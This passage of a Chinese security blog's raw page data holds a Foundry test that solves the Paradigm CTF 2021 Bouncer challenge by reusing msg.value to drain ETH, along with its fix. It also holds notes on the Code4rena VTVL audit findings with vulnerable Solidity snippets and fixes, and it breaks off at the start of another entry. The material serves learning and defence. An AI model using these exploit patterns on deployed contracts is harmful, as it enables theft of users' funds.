0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/tools/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    Setup public level;</span><br><span class="line">    Bouncer public bouncer;</span><br><span class="line">    WETH9 public weth;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 初始化题目</span><br><span class="line">        weth = WETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line"></span><br><span class="line">        level = new Setup&#123;value: 100 ether&#125;(address(weth));</span><br><span class="line">        vm.label(address(level), &quot;level&quot;);</span><br><span class="line">        bouncer = level.bouncer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行攻击</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(20 ether);</span><br><span class="line">        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line">        vm.label(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, &quot;player&quot;);</span><br><span class="line"></span><br><span class="line">        for(uint256 i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            // entry[msg.sender][0] ~ entry[msg.sender][9]</span><br><span class="line">            bouncer.enter&#123;value: 1 ether&#125;(ETH, 10 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        //此时Bouncer余额：62ETH</span><br><span class="line">        </span><br><span class="line">        // 等待一下，因为不能马上存款</span><br><span class="line">        // require(block.timestamp != entry.timestamp, &quot;err/wait after entering&quot;);</span><br><span class="line">        vm.warp(block.timestamp + 1);</span><br><span class="line"></span><br><span class="line">        // 构造数组</span><br><span class="line">        uint256[] memory ids = new uint256[](10);</span><br><span class="line">        for(uint256 i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            ids[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 10 ETH成功存了10次（本来需要100ETH）</span><br><span class="line">        bouncer.convertMany&#123;value: 10 ether&#125;(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), ids);</span><br><span class="line">        //此时Bouncer余额：72ETH</span><br><span class="line"></span><br><span class="line">        // 取走72ETH</span><br><span class="line">        for(uint256 i = 0; i &lt; 7; i++)&#123;</span><br><span class="line">            bouncer.redeem(ERC20Like(address(ETH)), 10 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        bouncer.redeem(ERC20Like(address(ETH)), 2 ether);</span><br><span class="line"></span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署WETH</span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修改"><a href="#漏洞修改" class="headerlink" title="漏洞修改"></a>漏洞修改</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function convertMany(address who, uint256[] memory ids) payable public &#123;</span><br><span class="line">    for (uint256 i = 0; i &lt; ids.length; i++) &#123;</span><br><span class="line">        //convert(who, ids[i]); 改成下面的就可以了</span><br><span class="line">        this.convert(who, ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模拟实验：本题的问题和A合约中的<code>canBuy()</code>原理一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    uint256 public x = 0;</span><br><span class="line"></span><br><span class="line">    function money() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;not enough money&quot;);</span><br><span class="line">        x++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function canBuy() public payable &#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            // 少了this则用的是方法的msg.value，在本次调用永远不变，如果此方法中有其他本合约的payable方法调用，则msg.value会传递进去。</span><br><span class="line">            money();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cannotBuy() public payable &#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            this.money();</span><br><span class="line">            // 为什么这个不可以运行呢？</span><br><span class="line">            // 因为this是一个对象，每运行一次，自身的msg.value属性就会减去，会更新自己的msg.value，优先级大于方法的msg.value。</span><br><span class="line">            // 而少了this则用的是方法的msg.value，在本次调用永远不变，如果方法中有其他本合约的payable方法调用，则msg.value会传递进去。</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bCanBuy(B b) public payable &#123;</span><br><span class="line">        b.money&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bCannotBuy(B b) public payable &#123;</span><br><span class="line">        // 无法购买的原因是没有将msg.value传递过去</span><br><span class="line">        b.money();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bMultiBuy(B b) public payable &#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; 2; i++)&#123;</span><br><span class="line">            console.log(&quot;start buying, my msg.value=&quot;,msg.value);</span><br><span class="line">            //b.money&#123;value: msg.value&#125;();   </span><br><span class="line">            //  报错，因为第一次的时候就将this的所有msg.value发过去了，this没钱了，而打印出来的msg.value是方法的msg.value</span><br><span class="line">                // start buying, my msg.value= 2000000000000000000</span><br><span class="line">                // before buy, msg.value= 2000000000000000000</span><br><span class="line">                // after buy, msg.value= 2000000000000000000</span><br><span class="line">                // start buying, my msg.value= 2000000000000000000</span><br><span class="line">                // transact to A.bMultiBuy errored: VM error: revert.</span><br><span class="line">            b.money&#123;value: 1 ether&#125;();</span><br><span class="line">            // 正确</span><br><span class="line">                // start buying, my msg.value= 2000000000000000000</span><br><span class="line">                // before buy, msg.value= 1000000000000000000</span><br><span class="line">                // after buy, msg.value= 1000000000000000000</span><br><span class="line">                // start buying, my msg.value= 2000000000000000000 这里的2ether是方法的msg.value,而实际的this的msg.value只有1ether</span><br><span class="line">                // before buy, msg.value= 1000000000000000000</span><br><span class="line">                // after buy, msg.value= 1000000000000000000</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    uint256 public x = 0;</span><br><span class="line"></span><br><span class="line">    function money() public payable &#123;</span><br><span class="line">        console.log(&quot;before buy, msg.value=&quot;,msg.value);</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;not enough money&quot;);</span><br><span class="line">        console.log(&quot;after buy, msg.value=&quot;,msg.value);</span><br><span class="line">        x++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.VTVL-2022-09@Code4rena</title>
      <link href="/2023/09/18/21.audit/01.VTVL-2022-09@Code4rena/"/>
      <url>/2023/09/18/21.audit/01.VTVL-2022-09@Code4rena/</url>
      
        <content type="html"><![CDATA[<h1 id="VTVL-2022-09-Code4rena"><a href="#VTVL-2022-09-Code4rena" class="headerlink" title="VTVL-2022-09@Code4rena"></a>VTVL-2022-09@Code4rena</h1><h2 id="项目意图"><a href="#项目意图" class="headerlink" title="项目意图"></a>项目意图</h2><p>这是一个代币释放的<a href="https://github.com/code-423n4/2022-09-vtvl/tree/main/contracts">项目</a>：项目方给用户创建一个Claim，用户到达某个时间点释放代币（cliff），或者线性释放代币（linear）。</p><p><a href="https://code4rena.com/reports/2022-09-vtvl#01">审计报告链接</a></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="1-权限控制"><a href="#1-权限控制" class="headerlink" title="1.权限控制"></a>1.权限控制</h3><ul><li>漏洞：任何admin都可以取消其他admin权限，这可能是有意或者无意的，取决于项目方</li><li>例子：A和B都是admin，那么都可以调用这个方法。A调用这个方法，<code>address admin</code>参数传入的是B的地址，然后就将B的admin修改为false了</li><li>修复：<code>_admins[admin] = isEnabled;</code> ===&gt;  <code>_admins[msg.sender] = isEnabled;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setAdmin(address admin, bool isEnabled) public onlyAdmin &#123;</span><br><span class="line">    require(admin != address(0), &quot;INVALID_ADDRESS&quot;);</span><br><span class="line">    _admins[admin] = isEnabled;</span><br><span class="line">    emit AdminAccessSet(admin, isEnabled);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-创建Claim"><a href="#2-创建Claim" class="headerlink" title="2.创建Claim"></a>2.创建Claim</h3><ul><li><p>漏洞1：没有和当前时间比较，如果开始时间和结束时间都小于当前时间，也是满足条件的,，通过所有检验然后创建Claim。然后就可以直接取完这笔钱，不用等待。</p><ul><li>例子：当前时间是2017年，你设置的startTime为2013年，结束时间为2016年，那么创建成功之后就可以直接获取金额了</li><li>修复：创建Claim的时候，判断startTime必须大于当前时间</li></ul></li><li><p>漏洞2：整个项目只有push，没有remove，随着时间推移，这个vestingRecipients数组会越来越大，然后有些方法在调用<code>allVestingRecipients()</code>获取数据的时候，由于数据巨大，遍历下来消耗的gas非常多（比如价值10ETH的gas），就会造成DoS</p><ul><li>例子：十年之后，这个合约还在运行，但是这个数组的大小已经变成了2^255，虽然还有空间，但是遍历使用找到你的位置的时候（比如你是在2^254位置），消耗了1000ETH，这就很离谱</li><li>修复：代码逻辑当中增加remove数组元素的逻辑</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  struct Claim &#123;</span><br><span class="line">      uint40 startTimestamp; </span><br><span class="line">      uint40 endTimestamp; </span><br><span class="line">      uint40 cliffReleaseTimestamp; // 到了某个时间节点，将cliffAmount全部给你</span><br><span class="line">      uint40 releaseIntervalSecs; // 计算每秒得到的amount数量</span><br><span class="line"></span><br><span class="line">      uint112 linearVestAmount; // 线性释放的总金额</span><br><span class="line">      uint112 cliffAmount; </span><br><span class="line">      uint112 amountWithdrawn; // 已经取了的金额</span><br><span class="line">      bool isActive; // 为true才能取</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  function _createClaimUnchecked(...) private  hasNoClaim(_recipient) &#123;</span><br><span class="line">...</span><br><span class="line">      // 漏洞1：</span><br><span class="line">      require(_startTimestamp &gt; 0, &quot;INVALID_START_TIMESTAMP&quot;);</span><br><span class="line">      require(_startTimestamp &lt; _endTimestamp, &quot;INVALID_END_TIMESTAMP&quot;); </span><br><span class="line">      ...</span><br><span class="line">      // 漏洞：2</span><br><span class="line">      vestingRecipients.push(_recipient); // add the vesting recipient to the list</span><br><span class="line">      emit ClaimCreated(_recipient, _claim); // let everyone know</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>漏洞3：<code>revokeClaim()</code>只将isActive设置为false，而没有将startTimestamp设置为0。因此，如果一个用户之前的Claim被revoke，那么他无法再次创建新的Claim。</li><li>例子：一个用户离开公司被revoke，再回公司则无法再次创建</li><li>修复：用判断isAcitve代替startTimestamp，或者revoke的时候同时将startTimestamp设置为0</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">modifier hasNoClaim(address _recipient) &#123;</span><br><span class="line">    Claim storage _claim = claims[_recipient];</span><br><span class="line">    // 漏洞3</span><br><span class="line">    require(_claim.startTimestamp == 0, &quot;CLAIM_ALREADY_EXISTS&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function revokeClaim(address _recipient) external onlyAdmin hasActiveClaim(_recipient) &#123;</span><br><span class="line">    Claim storage _claim = claims[_recipient];</span><br><span class="line">    uint112 finalVestAmt = finalVestedAmount(_recipient);</span><br><span class="line"></span><br><span class="line">    require( _claim.amountWithdrawn &lt; finalVestAmt, &quot;NO_UNVESTED_AMOUNT&quot;);</span><br><span class="line"></span><br><span class="line">    uint112 amountRemaining = finalVestAmt - _claim.amountWithdrawn;</span><br><span class="line"></span><br><span class="line">    _claim.isActive = false;</span><br><span class="line">    numTokensReservedForVesting -= amountRemaining;</span><br><span class="line">    emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-核心计算"><a href="#3-核心计算" class="headerlink" title="3.核心计算"></a>3.核心计算</h3><ul><li>漏洞1：<code>linearVestAmount</code>是根据时间比例来得到的（线性释放的金额 * 已过去的时间 / 总时间），但因为它是uint112，限制了最大的token数目。<ul><li>例子：释放时间是1年，代币是ERC20，代币单位10e18，过了一年之后，<code>linearVestAmount</code>的最大值就是<code>2 ** 12 / 10e18 / 3600 * 24 * 365 ~= m</code>个，因此在释放时间设置为1年的情况下，token的数目最多设置为m，m可见是一个不大的数目。一旦设置的数目超过m，那么计算得到的<code>linearVestAmount</code>就会超过uint112操作存储的大小，导致overflow revert</li><li>修复：将<code>linearVestAmount</code>设置为uint256类型</li></ul></li><li>漏洞2：计算向下取整导致结果为0，前几天无法领取金额，降低了用户的体验感<ul><li>例子：ERC20代币10e6，一共10000个token，线性释放时间一共10年。<code>_claim.linearVestAmount * truncatedCurrentVestingDurationSecs</code>必须大于等于<code>finalVestingDurationSecs</code>才能取出钱，否则向下取整为0。经过计算，大概在12天之后，计算出来的结果才大于等于1，用户在12天之后才能调用函数领取金额</li><li>修复：释放时间和释放总金额应该相协调，否则会出现上面需要过一段时间之后才能领取的情况</li></ul></li><li>漏洞3：<code>vestedAmount()</code>查看可领金额不正确<ul><li>例子：startTime=2020, end=2022, 现在是2019,那么调用<code>vestedAmount()</code>查看我能领取多少金额的时候，会发现不是0而是传入的<code>_referenceTs</code>，而正确逻辑应该是0</li><li>修复：如果尚未达到startTime就调用<code>vestedAmount()</code>查看可领金额，返回0</li></ul></li><li>收获：遇到乘法判断是否overflow，除法是否除数为0</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function _baseVestedAmount(Claim memory _claim, uint40 _referenceTs) internal pure returns (uint112) &#123;</span><br><span class="line">    uint112 vestAmt = 0;</span><br><span class="line">    </span><br><span class="line">    if(_claim.isActive) &#123;</span><br><span class="line">        if(_referenceTs &gt; _claim.endTimestamp) &#123;</span><br><span class="line">            _referenceTs = _claim.endTimestamp;</span><br><span class="line">        &#125;</span><br><span class="line">        // 如果endTimestamp是2017年，而cliffReleaseTimestamp是2018年，</span><br><span class="line">        // 则用户永远也取不出cliffAmount，因为_referenceTs = _claim.endTimestamp被锁死？</span><br><span class="line">        // 不存在这个问题，因为claim在创建的时候，已经做了比较，必须cliff在线性释放的前面</span><br><span class="line"></span><br><span class="line">        if(_referenceTs &gt;= _claim.cliffReleaseTimestamp) &#123;</span><br><span class="line">            vestAmt += _claim.cliffAmount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(_referenceTs &gt; _claim.startTimestamp) &#123;</span><br><span class="line">            uint40 currentVestingDurationSecs = _referenceTs - _claim.startTimestamp; </span><br><span class="line">            uint40 truncatedCurrentVestingDurationSecs = (currentVestingDurationSecs / _claim.releaseIntervalSecs) * _claim.releaseIntervalSecs;</span><br><span class="line">            uint40 finalVestingDurationSecs = _claim.endTimestamp - _claim.startTimestamp; </span><br><span class="line"></span><br><span class="line">            // 漏洞1，漏洞2</span><br><span class="line">            uint112 linearVestAmount = _claim.linearVestAmount * truncatedCurrentVestingDurationSecs / finalVestingDurationSecs;</span><br><span class="line"></span><br><span class="line">            vestAmt += linearVestAmount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return (vestAmt &gt; _claim.amountWithdrawn) ? vestAmt : _claim.amountWithdrawn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 漏洞3</span><br><span class="line">function vestedAmount(address _recipient, uint40 _referenceTs) public view returns (uint112) &#123;</span><br><span class="line">    Claim storage _claim = claims[_recipient];</span><br><span class="line">    return _baseVestedAmount(_claim, _referenceTs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-撤销Claim"><a href="#4-撤销Claim" class="headerlink" title="4.撤销Claim"></a>4.撤销Claim</h3><ul><li>漏洞：项目方revoke用户的Claim的时候，如果用户还有尚未领取的金额，并没有将用户尚未领取的金额发送给用户。这有点像用户直接没收了用户可以领取的金额了。这应该不是项目方本意。</li><li>例子：我的Claim是4年，目前过了2年，我还没领取，你直接revoke，把我炒了，但是没给我两年的金额</li><li>修复：admin在revoke的时候，应该将用户目前可以领取的金额发送给用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function revokeClaim(address _recipient) external onlyAdmin hasActiveClaim(_recipient) &#123;</span><br><span class="line">    Claim storage _claim = claims[_recipient];</span><br><span class="line">    uint112 finalVestAmt = finalVestedAmount(_recipient);</span><br><span class="line">    require( _claim.amountWithdrawn &lt; finalVestAmt, &quot;NO_UNVESTED_AMOUNT&quot;);</span><br><span class="line"></span><br><span class="line">    uint112 amountRemaining = finalVestAmt - _claim.amountWithdrawn;</span><br><span class="line">    _claim.isActive = false;</span><br><span class="line">    numTokensReservedForVesting -= amountRemaining;</span><br><span class="line"></span><br><span class="line">    emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-mint增发"><a href="#5-mint增发" class="headerlink" title="5.mint增发"></a>5.mint增发</h3><ul><li>漏洞：项目方原意是token总量是恒定的，但是检验被跳过，可以无限增发代币</li><li>例子：一开始mintableSupply=100，那么mint完100个之后，mintableSupply=0，不会进入if语句，跳过require检测，从而可以<code>_mint()</code></li><li><p>修复：<code>&gt;</code> 改成 <code>&gt;=</code>。鼓励使用<code>&gt;=</code>，因为solidity操作码没有<code>&gt;</code>，只有<code>&gt;=</code>，<code>&gt;</code>需要额外的操作码去判断</p></li><li><p>收获：遇到if的时候如果没有else，需要警惕，因为边界情况下可能被跳过。也可能是项目方留的后门，rugpull。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function mint(address account, uint256 amount) public onlyAdmin &#123;</span><br><span class="line">    require(account != address(0), &quot;INVALID_ADDRESS&quot;);</span><br><span class="line">    // 漏洞：当mint的值到达最大值的时候，这个检测将被跳过，没有任何限制</span><br><span class="line">    //       例子：一开始mintableSupply=100，那么mint完100个之后，</span><br><span class="line">    //            理论上不得再mint增发。但是治理是直接跳过了if判断没有进去</span><br><span class="line">    //            修改：&gt; 改成 &gt;=</span><br><span class="line">    if(mintableSupply &gt; 0) &#123;</span><br><span class="line">        require(amount &lt;= mintableSupply, &quot;INVALID_AMOUNT&quot;);</span><br><span class="line">        // We need to reduce the amount only if we&#x27;re using the limit, if not just leave it be</span><br><span class="line">        mintableSupply -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    _mint(account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-balanceOf异常"><a href="#6-balanceOf异常" class="headerlink" title="6.balanceOf异常"></a>6.balanceOf异常</h3><ul><li>漏洞：可变的余额导致资金被锁定或者损失</li><li>例子：某些 ERC20 代币的余额可能会发生变化，比如stETH。刚开始创建Claim的时候，价值是10，过一段时间，stETH价值降低变成5：<ul><li>对于admin：再次调用<code>_createClaimUnchecked()</code>，require就通过不了，因为stETH价值降低了，小于之前的numTokensReservedForVesting，造成DoS，解决这个的方式只有输入更多的钱到合约当中。</li><li>对于用户：调用<code>withdraw()</code>取钱的时候，可能无法成功获取，因为stETH价值降低，小于了amountRemaining从而revert</li></ul></li><li>修复：禁止这类价值可变的代币</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  // 例子：stETH</span><br><span class="line">  function balanceOf(address who) external override view returns (uint256) &#123;</span><br><span class="line">      return _shareBalances[who].div(_sharesPerToken);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function _createClaimUnchecked() private  hasNoClaim(_recipient) &#123;</span><br><span class="line">  ....</span><br><span class="line">  // 漏洞</span><br><span class="line">      require(tokenAddress.balanceOf(address(this)) &gt;= numTokensReservedForVesting + allocatedAmount, &quot;INSUFFICIENT_BALANCE&quot;);</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">      function withdraw() hasActiveClaim(_msgSender()) external &#123;</span><br><span class="line">  ....</span><br><span class="line">  // 漏洞</span><br><span class="line">      tokenAddress.safeTransfer(_msgSender(), amountRemaining);</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="7-代理取钱"><a href="#7-代理取钱" class="headerlink" title="7.代理取钱"></a>7.代理取钱</h3><ul><li>漏洞：原意是如果用户转错其他token到合约当中，可以取回。但是如果是token使用代理模式的情况下，会出现间接取款的问题</li><li>例子：有一个使用代理模式的token：Proxy数据存储合约和logic逻辑合约。我创建Claim的时候设置的tokenAddress是Proxy数据存储合约，并且设置100元。在Proxy和logic两个合约调用<code>balanceOf()</code>和<code>safeTransfer()</code>都可以得到100元的结果。因此我调用<code>withdrawOtherToken()</code>的时候，参数设置为logic合约，通过require的检验，拿走这笔钱，此时合约的token余额为0，但是numTokensReservedForVesting记录的仍然是100。最后用户在调用withdraw的时候就会显示余额不足而revert。</li><li>修复：使用余额检验代替地址检验</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdrawOtherToken(IERC20 _otherTokenAddress) external onlyAdmin &#123;</span><br><span class="line">    require(_otherTokenAddress != tokenAddress, &quot;INVALID_TOKEN&quot;); </span><br><span class="line">    uint256 bal = _otherTokenAddress.balanceOf(address(this));</span><br><span class="line">    require(bal &gt; 0, &quot;INSUFFICIENT_BALANCE&quot;);</span><br><span class="line">    _otherTokenAddress.safeTransfer(_msgSender(), bal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-重入攻击"><a href="#8-重入攻击" class="headerlink" title="8.重入攻击"></a>8.重入攻击</h3><ul><li>漏洞：如果tokenAddress是类如ERC777等拥有钩子函数的，那么可以在代币修改余额之前，通过钩子函数再次回调<code>withdrawAdmin()</code>跳过前面的require检验，从而重入攻击</li><li>例子：有一种ERC777的token，很多用户都选择了这种token创建Claim，此时合约中拥有1000个token。然后管理员发送100个token到合约当中，那么计算出来的amountRemaining就是10，那么调用<code>withdrawAdmin()</code>，在调用代币<code>safeTransfer()</code>的时候，回调到钩子函数，管理员在钩子函数中回调此方法10次，就取完了此合约中的所有ERC777token，把其他人的钱也拿走了</li><li>修复：添加nonReentrant</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  function withdrawAdmin(uint112 _amountRequested) public onlyAdmin &#123;    </span><br><span class="line">      uint256 amountRemaining = tokenAddress.balanceOf(address(this)) - numTokensReservedForVesting;</span><br><span class="line">      require(amountRemaining &gt;= _amountRequested, &quot;INSUFFICIENT_BALANCE&quot;);</span><br><span class="line">// 漏洞</span><br><span class="line">      tokenAddress.safeTransfer(_msgSender(), _amountRequested);</span><br><span class="line"></span><br><span class="line">      emit AdminWithdrawn(_msgSender(), _amountRequested);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 21.audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Sparkn-2023-08@codehawks</title>
      <link href="/2023/09/18/21.audit/02.Sparkn-2023-08@codehawks/"/>
      <url>/2023/09/18/21.audit/02.Sparkn-2023-08@codehawks/</url>
      
